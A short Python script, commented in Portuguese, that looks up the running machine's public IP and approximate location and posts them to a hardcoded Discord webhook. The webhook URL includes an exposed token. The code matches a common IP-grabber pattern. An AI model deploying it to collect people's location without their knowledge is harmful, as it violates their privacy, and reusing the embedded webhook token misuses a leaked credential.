import requests

# Obtem IP
ip_response = requests.get('https://api.ipify.org?format=json')
ip = ip_response.json().get('ip')

# Obtem localizacao aproximada
geo_response = requests.get(f'https://ipapi.co/{ip}/json/')
geo = geo_response.json()
cidade = geo.get('city')
estado = geo.get('region')
pais = geo.get('country_name')

# Mensagem formatada
mensagem = f"📡 IP: {ip}\n📍 Localização: {cidade}, {estado}, {pais}"

# Webhook do Discord (coloque o seu)
webhook_url = "https://discord.com/api/webhooks/1367815361348505630/GMsFv2cJfYfKY6FFziPLNy3KCU4DkZkiGaWYaOjmr2K9WWZY6YCI0yWnGMGHW01-pnTp"

# Envia mensagem
requests.post(webhook_url, json={"content": mensagem})
